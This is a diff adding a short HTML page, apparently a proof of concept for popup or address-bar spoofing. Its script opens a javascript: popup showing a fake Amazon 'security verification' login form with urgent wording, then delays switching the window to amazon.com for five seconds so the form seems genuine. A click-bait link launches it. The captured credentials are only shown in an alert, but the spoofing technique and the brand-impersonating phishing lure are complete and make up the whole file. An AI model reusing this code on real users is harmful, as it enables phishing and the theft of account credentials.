@@ -1,0 +1,13 @@
+<script>
+function spoofInteractive() {
+    // Open popup with javascript URI and interactive content
+    var w = window.open("javascript:document.write('<h1>Amazon Security Update</h1><form onsubmit=\"alert(\\'Credentials captured: \\' + this.email.value)\"><p>Enter your Amazon credentials:</p><input type=\"email\" name=\"email\" placeholder=\"Email\" required><br><input type=\"password\" name=\"password\" placeholder=\"Password\" required><br><button type=\"submit\">Verify Account</button></form><p style=\"color:red\">Urgent: Security verification required</p>');", "spoof", "width=500,height=400");
+    
+    // Delay the location change to maintain interactability
+    setTimeout(function() {
+        w.location = 'http://amazon.com';
+    }, 5000); // 5-second window for user interaction
+}
+</script>
+
+<a href="#" onclick="spoofInteractive()">Amazon Security Verification Required - Click Here</a>
